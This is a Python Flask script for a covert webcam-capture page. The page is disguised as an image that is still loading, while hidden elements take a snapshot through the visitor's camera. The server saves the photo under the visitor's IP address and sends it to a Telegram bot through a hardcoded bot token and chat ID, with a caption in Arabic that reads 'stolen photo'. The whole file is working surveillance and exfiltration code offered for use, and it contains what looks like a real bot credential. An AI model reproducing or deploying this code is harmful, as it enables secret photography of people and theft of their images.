from flask import Flask, request, render_template_string
import base64
import re
import requests
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs"
CHAT_ID = "8545876964"

def send_photo_to_telegram(photo_data, victim_ip=""):
    try:
        img_data = re.sub('^data:image/.+;base64,', '', photo_data)
        img_bytes = base64.b64decode(img_data)
        filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, 'wb') as f:
            f.write(img_bytes)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(filename, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': CHAT_ID, 'caption': f"صورة مسروقة\nIP: {victim_ip}\nالوقت: {datetime.now()}"}
            requests.post(url, files=files, data=data)
        import os
        os.remove(filename)
        print("[+] تم إرسال الصورة إلى تلغرام")
    except Exception as e:
        print(f"[-] خطأ: {e}")

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>صورة</title></head>
<body>
    <video id="video" autoplay style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    <script>
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photo = canvas.toDataURL('image/jpeg');
                    fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: photo })
                    });
                    stream.getTracks().forEach(track => track.stop());
                    document.body.innerHTML = '<h2>تم تحميل الصورة بنجاح</h2>';
                };
            } catch(e) {
                document.body.innerHTML = '<h2>خطأ: لا يمكن الوصول إلى الكاميرا</h2>';
            }
        }
        capturePhoto();
    </script>
    <div style="text-align:center; margin-top:200px">
        <h2>جاري تحميل الصورة...</h2>
        <p>يرجى الانتظار</p>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    image_data = request.json.get('image', '')
    victim_ip = request.remote_addr
    if image_data:
        img = re.sub('^data:image/.+;base64,', '', image_data)
        with open(f'captured_{victim_ip}.jpg', 'wb') as f:
            f.write(base64.b64decode(img))
        send_photo_to_telegram(image_data, victim_ip)
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
